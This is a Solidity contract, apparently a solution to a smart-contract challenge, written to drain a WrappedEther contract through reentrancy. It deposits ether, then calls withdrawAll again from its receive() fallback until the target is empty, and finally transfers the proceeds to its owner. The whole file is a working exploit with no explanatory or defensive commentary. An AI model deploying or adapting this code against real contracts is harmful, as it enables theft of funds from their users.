pragma solidity ^0.8.25;

import "./WrappedEther.sol";

contract WrappedEtherExploit {
    WrappedEther public target;
    address public owner;

    constructor(address _target) {
        target = WrappedEther(_target);
        owner = msg.sender;
    }

    function exploit() external payable {
        require(msg.value > 0, "<<<<<<0");

        target.deposit{value: msg.value}(address(this));
        target.withdrawAll();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawAll();
        }
    }

    function withdrawF() external {
        payable(owner).transfer(address(this).balance);
    }
}
